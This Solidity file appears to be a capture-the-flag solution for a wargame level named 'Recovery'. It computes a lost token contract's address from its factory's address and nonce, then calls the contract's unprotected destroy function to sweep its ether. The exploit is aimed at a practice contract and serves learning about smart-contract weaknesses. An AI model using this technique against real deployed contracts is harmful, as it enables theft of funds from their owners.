// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {RecoveryFactory} from "../src/levels/17-RecoveryFactory.sol";
import {SimpleToken} from "../src/levels/17-Recovery.sol";

contract RecoverySolution is BaseTest {

    function solution(address payable targetAddress) internal override{
        bytes memory rlpEncode = bytes.concat(
            bytes1(uint8(0xc0)+uint8(0x16)),
            bytes1(uint8(0x80)+uint8(0x14)),
            bytes20(address(targetAddress)),
            bytes1(uint8(1))
        );
        bytes32 hashOutput = keccak256(rlpEncode);
        address firstDeployAddress = address(bytes20(hashOutput << 12*8));
        SimpleToken(payable(firstDeployAddress)).destroy(payable(this));
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new RecoveryFactory()));
    }

    receive() external payable {}
}
